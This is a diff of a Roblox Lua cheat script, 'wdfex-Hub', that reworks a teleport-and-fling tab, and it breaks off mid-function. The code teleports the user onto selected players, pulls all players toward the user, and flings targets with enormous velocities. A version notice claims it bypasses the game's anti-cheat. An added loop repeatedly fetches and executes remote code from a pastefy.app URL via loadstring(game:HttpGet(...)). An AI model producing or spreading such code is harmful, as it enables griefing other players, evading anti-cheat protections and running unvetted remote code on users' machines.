@@ -21,7 +21,7 @@ for i = 1, #username do
     coloredUsername = coloredUsername .. '<font color="' .. gradientColors[colorIndex] .. '">' .. username:sub(i, i) .. '</font>'
 end
 
-local version = "v3.0.7"
+local version = "v3.0.3"
 local coloredVersion = ""
 for i = 1, #version do
     local colorIndex = (i - 1) % #gradientColors + 1
@@ -60,89 +60,20 @@ function createUI()
     local isDestroyed = false
     local connections = {}
 
-    PlayerConfig = {
-        playernamedied = nil,
-        dropdown = {},
-        LoopTeleport = false,
-        LoopBring = false,
-    }
+    -- 传送甩飞的全局变量
+    bin = bin or {}
+    bin.dropdown = {}
+    bin.playernamedied = nil
 
-    local function Notify(title, content, icon, duration)
-        WindUI:Notify({ Title = title, Content = content, Duration = duration or 3 })
-    end
-
-    local function shuaxinlb(silent)
-        PlayerConfig.dropdown = {}
+    local function shuaxinlb()
+        bin.dropdown = {}
         for _, p in ipairs(Players:GetPlayers()) do
             if p ~= player then
-                table.insert(PlayerConfig.dropdown, p.Name)
+                table.insert(bin.dropdown, p.Name)
             end
         end
-        if not silent then
-            Notify("wdfex脚本", "已刷新玩家列表", "rbxassetid://18941716391", 3)
-        end
     end
-    shuaxinlb(true)
-
-    -- ==================== 获取目标玩家 CFrame（多方法尝试） ====================
-    local function getTargetCFrame(targetPlayer)
-        if not targetPlayer then return nil end
-        local ok, char = pcall(function() return targetPlayer.Character end)
-        if not ok or not char then return nil end
-        -- 方法1：HumanoidRootPart
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        if hrp then
-            local ok2, cf = pcall(function() return hrp.CFrame end)
-            if ok2 and cf then return cf end
-        end
-        -- 方法2：PrimaryPart
-        local pp = char.PrimaryPart
-        if pp then
-            local ok2, cf = pcall(function() return pp.CFrame end)
-            if ok2 and cf then return cf end
-        end
-        -- 方法3：GetPivot
-        local ok2, pivot = pcall(function() return char:GetPivot() end)
-        if ok2 and pivot then return pivot end
-        -- 方法4：任意 BasePart
-        local anyPart = char:FindFirstChildWhichIsA("BasePart")
-        if anyPart then
-            local ok3, cf = pcall(function() return anyPart.CFrame end)
-            if ok3 and cf then return cf end
-        end
-        return nil
-    end
-
-    -- ==================== 设置目标玩家 CFrame（多方法尝试） ====================
-    local function setTargetCFrame(targetPlayer, cframe)
-        if not targetPlayer then return false end
-        local ok, char = pcall(function() return targetPlayer.Character end)
-        if not ok or not char then return false end
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        if hrp then
-            local ok2 = pcall(function() hrp.CFrame = cframe end)
-            if ok2 then return true end
-        end
-        local pp = char.PrimaryPart
-        if pp then
-            local ok2 = pcall(function() pp.CFrame = cframe end)
-            if ok2 then return true end
-        end
-        local ok2 = pcall(function() char:PivotTo(cframe) end)
-        if ok2 then return true end
-        return false
-    end
-
-    -- ==================== 请求加载目标周围地形 ====================
-    local function requestStreamAround(targetPlayer)
-        if not targetPlayer then return end
-        local cf = getTargetCFrame(targetPlayer)
-        if cf then
-            pcall(function()
-                player:RequestStreamAroundAsync(cf.Position)
-            end)
-        end
-    end
+    shuaxinlb()
 
     local Window = WindUI:CreateWindow({
         Title = 'wdfex-Hub',
@@ -382,7 +313,7 @@ function createUI()
     local infoSection2 = infoTab:Section({ Title = "更新公告", Icon = "bell", Opened = true })
     infoSection2:Divider()
     infoSection2:Paragraph({
-        Title = "v3.0.7提示",
+        Title = "v3.0.3提示",
         Desc = "已更新最新绕过反作弊但可能还是可能有概率会被服务器踢出",
         ThumbnailSize = 190,
     })
@@ -412,704 +343,164 @@ function createUI()
     -- ============================================================
     -- 传送与甩飞
     -- ============================================================
-    local dropdownMethod = "Dropdown"
-    local dropdownLabel = "选择玩家名称"
-    local playerDropdown = TeleportFlingTab:Dropdown({
-        Title = "选择玩家名称",
-        Values = PlayerConfig.dropdown,
-        Value = PlayerConfig.dropdown[1],
-        Callback = function(selectedPlayer)
-            PlayerConfig.playernamedied = selectedPlayer
+    local SelectedSection = TeleportFlingTab:Section({ Title = "选中玩家传送甩飞", Opened = true })
+
+    local playerDropdown
+    playerDropdown = SelectedSection:Dropdown({
+        Title = "选择玩家",
+        Values = bin.dropdown,
+        Value = bin.dropdown[1],
+        Callback = function(v)
+            bin.playernamedied = v
         end
     })
 
-    TeleportFlingTab:Button({
-        Title = "刷新玩家名称",
+    game.Players.PlayerAdded:Connect(function()
+        shuaxinlb()
+        if playerDropdown then
+            pcall(function() playerDropdown:Refresh(bin.dropdown) end)
+        end
+    end)
+    game.Players.PlayerRemoving:Connect(function()
+        shuaxinlb()
+        if playerDropdown then
+            pcall(function() playerDropdown:Refresh(bin.dropdown) end)
+        end
+    end)
+
+    SelectedSection:Button({
+        Title = "刷新玩家列表",
         Callback = function()
-            shuaxinlb(true)
+            shuaxinlb()
             if playerDropdown then
-                pcall(function()
-                    playerDropdown:Refresh(PlayerConfig.dropdown)
-                end)
+                pcall(function() playerDropdown:Refresh(bin.dropdown) end)
             end
         end
     })
 
-    TeleportFlingTab:Button({
+    SelectedSection:Button({
         Title = "传送到玩家旁边",
         Callback = function()
-            local localRootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
-            local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
-            if targetPlayer then
-                local cf = getTargetCFrame(targetPlayer)
-                if cf and localRootPart then
-                    localRootPart.CFrame = cf + Vector3.new(0, 3, 0)
-                    Notify("wdfex脚本", "已经传送到玩家身边", "rbxassetid://18941716391", 5)
-                else
-                    requestStreamAround(targetPlayer)
-                    task.wait(0.3)
-                    cf = getTargetCFrame(targetPlayer)
-                    if cf and localRootPart then
-                        localRootPart.CFrame = cf + Vector3.new(0, 3, 0)
-                        Notify("wdfex脚本", "已经传送到玩家身边", "rbxassetid://18941716391", 5)
-                    else
-                        Notify("wdfex脚本", "无法传送 原因: 玩家位置未加载", "rbxassetid://18941716391", 5)
-                    end
-                end
-            else
-                Notify("wdfex脚本", "无法传送 原因: 玩家已消失", "rbxassetid://18941716391", 5)
+            local HumRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            local tp_player = game.Players:FindFirstChild(bin.playernamedied)
+            if (tp_player and tp_player.Character and tp_player.Character:FindFirstChild("HumanoidRootPart")) then
+                HumRoot.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
             end
         end
     })
 
-    TeleportFlingTab:Toggle({
-        Title = "循环锁定传送",
+    SelectedSection:Toggle({
+        Title = "循环传送指定玩家",
         Value = false,
-        Callback = function(enabled)
-            if enabled then
-                PlayerConfig.LoopTeleport = true
-                Notify("wdfex脚本", "已开启循环传送", "rbxassetid://18941716391", 5)
-                task.spawn(function()
-                    while PlayerConfig.LoopTeleport and not isDestroyed do
-                        local localRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                        local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
-                        if localRootPart and targetPlayer then
-                            local cf = getTargetCFrame(targetPlayer)
-                            if cf then
-                                pcall(function()
-                                    localRootPart.CFrame = cf + Vector3.new(0, 3, 0)
-                                end)
-                            else
-                                requestStreamAround(targetPlayer)
-                            end
+        Callback = function(TP)
+            getgenv().EnableTP = TP
+            if TP then
+                spawn(function()
+                    while getgenv().EnableTP do
+                        local HumRoot = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                        local tp_player = game.Players:FindFirstChild(bin.playernamedied)
+                        if (HumRoot and tp_player and tp_player.Character and tp_player.Character:FindFirstChild("HumanoidRootPart")) then
+                            HumRoot.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                         end
-                        task.wait()
+                        task.wait(0.01)
                     end
                 end)
-            else
-                PlayerConfig.LoopTeleport = false
-                Notify("wdfex脚本", "已关闭循环传送", "rbxassetid://18941716391", 5)
             end
         end
     })
 
-    TeleportFlingTab:Button({
-        Title = "把玩家传送过来",
-        Callback = function()
-            local localRootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
-            local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
-            if targetPlayer and localRootPart then
-                local ok = setTargetCFrame(targetPlayer, localRootPart.CFrame + Vector3.new(0, 3, 0))
-                if ok then
-                    Notify("wdfex脚本", "已将玩家传送过来", "rbxassetid://18941716391", 5)
-                else
-                    requestStreamAround(targetPlayer)
-                    task.wait(0.3)
-                    ok = setTargetCFrame(targetPlayer, localRootPart.CFrame + Vector3.new(0, 3, 0))
-                    if ok then
-                        Notify("wdfex脚本", "已将玩家传送过来", "rbxassetid://18941716391", 5)
-                    else
-                        Notify("wdfex脚本", "无法传送 原因: 玩家位置未加载", "rbxassetid://18941716391", 5)
-                    end
-                end
-            else
-                Notify("wdfex脚本", "无法传送 原因: 玩家已消失", "rbxassetid://18941716391", 5)
-            end
-        end
-    })
-
-    TeleportFlingTab:Toggle({
-        Title = "循环传送玩家过来",
+    getgenv().IsFlingLoopEnabled = false
+    SelectedSection:Toggle({
+        Title = "循环甩飞指定玩家",
         Value = false,
-        Callback = function(enabled)
-            if enabled then
-                PlayerConfig.LoopBring = true
-                Notify("wdfex脚本", "已开启循环传送玩家过来", "rbxassetid://18941716391", 5)
-                task.spawn(function()
-                    while PlayerConfig.LoopBring and not isDestroyed do
-                        local localRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                        local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
-                        if localRootPart and targetPlayer then
-                            setTargetCFrame(targetPlayer, localRootPart.CFrame + Vector3.new(0, 3, 0))
+        Callback = function(state)
+            getgenv().IsFlingLoopEnabled = state
+            if state then
+                spawn(function()
+                    while getgenv().IsFlingLoopEnabled do
+                        local HumRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                        local tp_player = game.Players:FindFirstChild(bin.playernamedied)
+                        if (tp_player and tp_player.Character and tp_player.Character:FindFirstChild("HumanoidRootPart") and HumRoot) then
+                            HumRoot.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                         end
-                        task.wait()
+                        if getgenv().IsFlingLoopEnabled then
+                            loadstring(game:HttpGet("https://pastefy.app/od3cnFl6/raw"))()
+                        end
+                        task.wait(1e-14)
                     end
                 end)
-            else
-                PlayerConfig.LoopBring = false
-                Notify("wdfex脚本", "已关闭循环传送玩家过来", "rbxassetid://18941716391", 5)
             end
         end
     })
 
-    TeleportFlingTab:Toggle({
-        Title = "吸全部玩家",
-        Value = false,
-        Callback = function(enabled)
-            if enabled then
-                while enabled do
-                    for _, player_ in next, game:GetService("Players"):GetPlayers() do
-                        if player_.Name ~= game:GetService("Players").LocalPlayer.Name then
-                            local localPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
-                            local lookVector = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector
-                            player_.Character.HumanoidRootPart.CFrame = CFrame.new(localPosition + lookVector * 3, localPosition + lookVector * 4)
-                            wait()
-                        end
-                    end
-                end
-            end
-        end
-    })
-
-    TeleportFlingTab:Toggle({
+    SelectedSection:Toggle({
         Title = "查看玩家",
         Value = false,
-        Callback = function(enabled)
-            if enabled then
-                local tp = game:GetService("Players"):FindFirstChild(PlayerConfig.playernamedied)
-                if tp and tp.Character and tp.Character:FindFirstChildOfClass("Humanoid") then
-                    game:GetService("Workspace").CurrentCamera.CameraSubject = tp.Character:FindFirstChildOfClass("Humanoid")
-                    Notify("wdfex脚本", "已开启查看玩家", "rbxassetid://18941716391", 5)
-                else
-                    Notify("wdfex脚本", "玩家未加载", "rbxassetid://18941716391", 5)
+        Callback = function(state)
+            if state then
+                local target = game:GetService("Players"):FindFirstChild(bin.playernamedied)
+                if (target and target.Character and target.Character:FindFirstChild("Humanoid")) then
+                    game:GetService("Workspace").CurrentCamera.CameraSubject = target.Character.Humanoid
                 end
-            else
-                game:GetService("Workspace").CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
-                Notify("wdfex脚本", "已关闭查看玩家", "rbxassetid://18941716391", 5)
+            elseif (player.Character and player.Character:FindFirstChild("Humanoid")) then
+                game:GetService("Workspace").CurrentCamera.CameraSubject = player.Character.Humanoid
             end
         end
     })
 
-    TeleportFlingTab:Button({
-        Title = "甩飞一次",
-        Callback = function()
-            if PlayerConfig.playernamedied ~= nil and PlayerConfig.playernamedied ~= nil then
-                local targetNames = {
-                    PlayerConfig.playernamedied
-                }
-                local Players = game:GetService("Players")
-                local localPlayer = Players.LocalPlayer
-                local isAllOrOthers = false
-                local function FindPlayerByName(name)
-                    name = name:lower()
-                    if name == "all" or name == "others" then
-                        isAllOrOthers = true
-                        return 
-                    end
-                    if name == "random" then
-                        local allPlayers = Players:GetPlayers()
-                        if table.find(allPlayers, localPlayer) then
-                            table.remove(allPlayers, table.find(allPlayers, localPlayer))
-                        end
-                        return allPlayers[math.random(#allPlayers)]
-                    end
-                    if name ~= "random" and name ~= "all" and name ~= "others" then
-                        for _, player_ in next, Players:GetPlayers() do
-                            if player_ ~= localPlayer then
-                                if player_.Name:lower():match("^" .. name) then
-                                    return player_
-                                end
-                                if player_.DisplayName:lower():match("^" .. name) then
-                                    return player_
-                                end
-                            end
-                        end
-                    else
-                        return 
-                    end
-                end
-                local function SendNotification(title, text, duration)
-                    game:GetService("StarterGui"):SetCore("SendNotification", {
-                        Title = title,
-                        Text = text,
-                        Duration = duration,
-                    })
-                end
-                local function ThrowPlayer(targetPlayer)
-                    local localCharacter = localPlayer.Character
-                    local localHumanoid = localCharacter and localCharacter:FindFirstChildOfClass("Humanoid")
-                    local localRootPart = localHumanoid and localHumanoid.RootPart
-                    local targetCharacter = targetPlayer.Character
-                    local targetHumanoid = nil
-                    local targetRootPart = nil
-                    local targetHead = nil
-                    local targetAccessory = nil
-                    local accessoryHandle = nil
-                    if targetCharacter:FindFirstChildOfClass("Humanoid") then
-                        targetHumanoid = targetCharacter:FindFirstChildOfClass("Humanoid")
-                    end
-                    if targetHumanoid and targetHumanoid.RootPart then
-                        targetRootPart = targetHumanoid.RootPart
-                    end
-                    if targetCharacter:FindFirstChild("Head") then
-                        targetHead = targetCharacter.Head
-                    end
-                    if targetCharacter:FindFirstChildOfClass("Accessory") then
-                        targetAccessory = targetCharacter:FindFirstChildOfClass("Accessory")
-                    end
-                    if Accessoy and targetAccessory:FindFirstChild("Handle") then
-                        accessoryHandle = targetAccessory.Handle
-                    end
-                    if localCharacter and localHumanoid and localRootPart then
-                        if localRootPart.Velocity.Magnitude < 50 then
-                            getgenv().OldPos = localRootPart.CFrame
-                        end
-                        if targetHumanoid and targetHumanoid.Sit and not isAllOrOthers then
-                            return SendNotification("玩家消失", "已停止", 5)
-                        end
-                        if targetHead then
-                            workspace.CurrentCamera.CameraSubject = targetHead
-                        elseif not targetHead and accessoryHandle then
-                            workspace.CurrentCamera.CameraSubject = accessoryHandle
-                        elseif targetHumanoid and targetRootPart then
-                            workspace.CurrentCamera.CameraSubject = targetHumanoid
-                        end
-                        if not targetCharacter:FindFirstChildWhichIsA("BasePart") then
-                            return 
-                        end
-                        local function ApplyThrowForce(part, offset, rotation)
-                            localRootPart.CFrame = CFrame.new(part.Position) * offset * rotation
-                            localCharacter:SetPrimaryPartCFrame(CFrame.new(part.Position) * offset * rotation)
-                            localRootPart.Velocity = Vector3.new(90000000, 900000000, 90000000)
-                            localRootPart.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
-                        end
-                        local function PerformThrowAnimation(part)
-                            local timeoutDuration = 2
-                            local startTime = tick()
-                            local rotationAngle = 0
-                            while localRootPart do
-                                local velocityMagnitude = part.Velocity.Magnitude
-                                if velocityMagnitude < 50 then
-                                    rotationAngle = rotationAngle + 100
-                                    ApplyThrowForce(part, CFrame.new(0, 1.5, 0) + targetHumanoid.MoveDirection * part.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(rotationAngle), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, -1.5, 0) + targetHumanoid.MoveDirection * part.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(rotationAngle), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(2.25, 1.5, -2.25) + targetHumanoid.MoveDirection * part.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(rotationAngle), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(-2.25, -1.5, 2.25) + targetHumanoid.MoveDirection * part.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(rotationAngle), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, 1.5, 0) + targetHumanoid.MoveDirection, CFrame.Angles(math.rad(rotationAngle), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, -1.5, 0) + targetHumanoid.MoveDirection, CFrame.Angles(math.rad(rotationAngle), 0, 0))
-                                    task.wait()
-                                else
-                                    ApplyThrowForce(part, CFrame.new(0, 1.5, targetHumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, -1.5, -targetHumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, 1.5, targetHumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, 1.5, targetRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, -1.5, -targetRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, 1.5, targetRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
-                                    task.wait()
-                                    ApplyThrowForce(part, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
-                                    task.wait()
-                                end
-                                velocityMagnitude = part.Velocity.Magnitude
-                                if velocityMagnitude <= 500 then
-                                    local partParent = part.Parent
-                                    if partParent == targetPlayer.Character then
-                                        partParent = targetPlayer.Parent
-                                        if partParent == Players then
-                                            local hasCharacter = not targetPlayer.Character
-                                            if hasCharacter ~= targetCharacter then
-                                                local isSitting = targetHumanoid.Sit
-                                                if not isSitting then
-                                                    local health = localHumanoid.Health
-                                                    if health > 0 then
-                                                        local currentTime = tick()
-                                                        if startTime + timeoutDuration < currentTime then
-                                                            break
-                                                        end
-                                                    else
-                                                        break
-                                                    end
-                                                else
-                                                    break
-                                                end
-                                            else
-                                                break
-                                            end
-                                        else
-                                            break
-                                        end
-                                    else
-                                        break
-                                    end
-                                else
-                                    break
-                                end
-                            end
-                        end
-                        workspace.FallenPartsDestroyHeight = 0 / 0
-                        local bodyVelocity = Instance.new("BodyVelocity")
-                        bodyVelocity.Name = "EpixVel"
-                        bodyVelocity.Parent = localRootPart
-                        bodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
-                        bodyVelocity.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
-                        localHumanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-                        if targetRootPart and targetHead then
-                            if (targetRootPart.CFrame.p - targetHead.CFrame.p).Magnitude > 5 then
-                                PerformThrowAnimation(targetHead)
-                            else
-                                PerformThrowAnimation(targetRootPart)
-                            end
-                        elseif targetRootPart and not targetHead then
-                            PerformThrowAnimation(targetRootPart)
-                        elseif not targetRootPart and targetHead then
-                            PerformThrowAnimation(targetHead)
-                        elseif not targetRootPart and not targetHead and targetAccessory and accessoryHandle then
-                            PerformThrowAnimation(accessoryHandle)
-                        else
-                            return SendNotification("wdfex脚本", "已开/关", 5)
-                        end
-                        bodyVelocity:Destroy()
-                        localHumanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-                        workspace.CurrentCamera.CameraSubject = localHumanoid
-                        repeat
-                            localRootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
-                            localCharacter:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
-                            localHumanoid:ChangeState("GettingUp")
-                            table.foreach(localCharacter:GetChildren(), function(_, child)
-                                if child:IsA("BasePart") then
-                                    local zeroVector = Vector3.new()
-                                    child.RotVelocity = Vector3.new()
-                                    child.Velocity = zeroVector
-                                end
-                            end)
-                            task.wait()
-                        until (localRootPart.Position - getgenv().OldPos.p).Magnitude < 25
-                        workspace.FallenPartsDestroyHeight = getgenv().FPDH
-                    else
-                        SendNotification("玩家消失", "已停止", 5)
-                    end
-                end
-                if targetNames[1] then
-                    for _, name in next, targetNames, nil do
-                        local foundPlayer = FindPlayerByName(name)
-                        if foundPlayer then
-                            ThrowPlayer(foundPlayer)
-                        end
-                    end
-                else
-                    return 
-                end
-                if isAllOrOthers then
-                    for _, player_ in next, Players:GetPlayers() do
-                        if player_ ~= localPlayer then
-                            ThrowPlayer(player_)
-                        end
-                    end
-                end
-                for _, name in next, targetNames, nil do
-                    local foundPlayer = FindPlayerByName(name)
-                    if foundPlayer and foundPlayer ~= localPlayer then
-                        if foundPlayer.UserId ~= 1414978355 then
-                            ThrowPlayer(foundPlayer)
-                        else
-                            SendNotification("检测到玩家消失", "己停止", 5)
-                        end
-                    elseif not FindPlayerByName(name) and not isAllOrOthers then
-                        SendNotification("未获取到玩家或工具", "已停止", 5)
-                    end
-                end
-            end
-        end
-    })
+    local AllSection = TeleportFlingTab:Section({ Title = "传送甩飞所有人", Opened = true })
 
-    TeleportFlingTab:Toggle({
-        Title = "循环甩飞",
+    AllSection:Toggle({
+        Title = "循环传送到所有玩家旁边",
         Value = false,
-        Callback = function(r0_53)
-            if PlayerConfig.playernamedied ~= nil and PlayerConfig.playernamedied ~= nil then
-                getgenv().autofling = r0_53
+        Callback = function(state)
+            getgenv().wow = state
+            if state then
                 spawn(function()
-                    while autofling do
-                        wait()
-                        pcall(function()
-                            local r0_55 = {
-                                PlayerConfig.playernamedied
-                            }
-                            local r1_55 = game:GetService("Players")
-                            local r2_55 = r1_55.LocalPlayer
-                            local r3_55 = false
-                            local function r4_55(r0_61)
-                                r0_61 = r0_61:lower()
-                                if r0_61 == "all" or r0_61 == "others" then
-                                    r3_55 = true
-                                    return 
-                                end
-                                if r0_61 == "random" then
-                                    local r1_61 = r1_55:GetPlayers()
-                                    if table.find(r1_61, r2_55) then
-                                        table.remove(r1_61, table.find(r1_61, r2_55))
+                    local lp = game.Players.LocalPlayer
+                    while getgenv().wow do
+                        for _, target in pairs(game:GetService("Players"):GetPlayers()) do
+                            if not getgenv().wow then break end
+                            if ((target ~= lp) and target.Character and target.Character:FindFirstChild("HumanoidRootPart")) then
+                                local targetRoot = target.Character.HumanoidRootPart
+                                local playerRoot = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+                                if playerRoot then
+                                    for i = 1, 3 do
+                                        if not getgenv().wow then break end
+                                        playerRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, -1.5)
+                                        task.wait(0.05)
+                                        playerRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 1.5)
+                                        task.wait(0.05)
                                     end
-                                    return r1_61[math.random(#r1_61)]
-                                end
-                                if r0_61 ~= "random" and r0_61 ~= "all" and r0_61 ~= "others" then
-                                    local r1_61 = next
-                                    local r2_61, r3_61 = r1_55:GetPlayers()
-                                    for r4_61, r5_61 in r1_61, r2_61, r3_61 do
-                                        if r5_61 ~= r2_55 then
-                                            if r5_61.Name:lower():match("^" .. r0_61) then
-                                                return r5_61
-                                            end
-                                            if r5_61.DisplayName:lower():match("^" .. r0_61) then
-                                                return r5_61
-                                            end
-                                        end
-                                    end
-                                else
-                                    return 
+                                    task.wait(0.2)
                                 end
                             end
-                            local function r5_55(r0_60, r1_60, r2_60)
-                                game:GetService("StarterGui"):SetCore("SendNotification", {
-                                    Title = r0_60,
-                                    Text = r1_60,
-                                    Duration = r2_60,
-                                })
-                            end
-                            local function r6_55(r0_56)
-                                local r1_56 = r2_55.Character
-                                local r2_56 = r1_56 and r1_56:FindFirstChildOfClass("Humanoid")
-                                local r3_56 = r2_56 and r2_56.RootPart
-                                local r4_56 = r0_56.Character
-                                local r5_56 = nil
-                                local r6_56 = nil
-                                local r7_56 = nil
-                                local r8_56 = nil
-                                local r9_56 = nil
-                                if r4_56:FindFirstChildOfClass("Humanoid") then
-                                    r5_56 = r4_56:FindFirstChildOfClass("Humanoid")
-                                end
-                                if r5_56 and r5_56.RootPart then
-                                    r6_56 = r5_56.RootPart
-                                end
-                                if r4_56:FindFirstChild("Head") then
-                                    r7_56 = r4_56.Head
-                                end
-                                if r4_56:FindFirstChildOfClass("Accessory") then
-                                    r8_56 = r4_56:FindFirstChildOfClass("Accessory")
-                                end
-                                if Accessoy and r8_56:FindFirstChild("Handle") then
-                                    r9_56 = r8_56.Handle
-                                end
-                                if r1_56 and r2_56 and r3_56 then
-                                    if r3_56.Velocity.Magnitude < 50 then
-                                        getgenv().OldPos = r3_56.CFrame
-                                    end
-                                    if r5_56 and r5_56.Sit and not r3_55 then
-                                        return r5_55("wdfex脚本", "错误❌", 5)
-                                    end
-                                    if r7_56 then
-                                        workspace.CurrentCamera.CameraSubject = r7_56
-                                    elseif not r7_56 and r9_56 then
-                                        workspace.CurrentCamera.CameraSubject = r9_56
-                                    elseif r5_56 and r6_56 then
-                                        workspace.CurrentCamera.CameraSubject = r5_56
-                                    end
-                                    if not r4_56:FindFirstChildWhichIsA("BasePart") then
-                                        return 
-                                    end
-                                    local function r10_56(r0_58, r1_58, r2_58)
-                                        r3_56.CFrame = CFrame.new(r0_58.Position) * r1_58 * r2_58
-                                        r1_56:SetPrimaryPartCFrame(CFrame.new(r0_58.Position) * r1_58 * r2_58)
-                                        r3_56.Velocity = Vector3.new(90000000, 900000000, 90000000)
-                                        r3_56.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
-                                    end
-                                    local function r11_56(r0_57)
-                                        local r1_57 = 2
-                                        local r2_57 = tick()
-                                        local r3_57 = 0
-                                        while r3_56 do
-                                            local r4_57 = r5_56
-                                            if r4_57 then
-                                                r4_57 = r0_57.Velocity.Magnitude
-                                                if r4_57 < 50 then
-                                                    r3_57 = r3_57 + 100
-                                                    r10_56(r0_57, CFrame.new(0, 1.5, 0) + r5_56.MoveDirection * r0_57.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(r3_57), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, -1.5, 0) + r5_56.MoveDirection * r0_57.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(r3_57), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(2.25, 1.5, -2.25) + r5_56.MoveDirection * r0_57.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(r3_57), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(-2.25, -1.5, 2.25) + r5_56.MoveDirection * r0_57.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(r3_57), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, 1.5, 0) + r5_56.MoveDirection, CFrame.Angles(math.rad(r3_57), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, -1.5, 0) + r5_56.MoveDirection, CFrame.Angles(math.rad(r3_57), 0, 0))
-                                                    task.wait()
-                                                else
-                                                    r10_56(r0_57, CFrame.new(0, 1.5, r5_56.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, -1.5, -r5_56.WalkSpeed), CFrame.Angles(0, 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, 1.5, r5_56.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, 1.5, r6_56.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, -1.5, -r6_56.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, 1.5, r6_56.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
-                                                    task.wait()
-                                                    r10_56(r0_57, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
-                                                    task.wait()
-                                                end
-                                                r4_57 = r0_57.Velocity.Magnitude
-                                                if r4_57 <= 500 then
-                                                    r4_57 = r0_57.Parent
-                                                    if r4_57 == r0_56.Character then
-                                                        r4_57 = r0_56.Parent
-                                                        if r4_57 == r1_55 then
-                                                            r4_57 = not r0_56.Character
-                                                            if r4_57 ~= r4_56 then
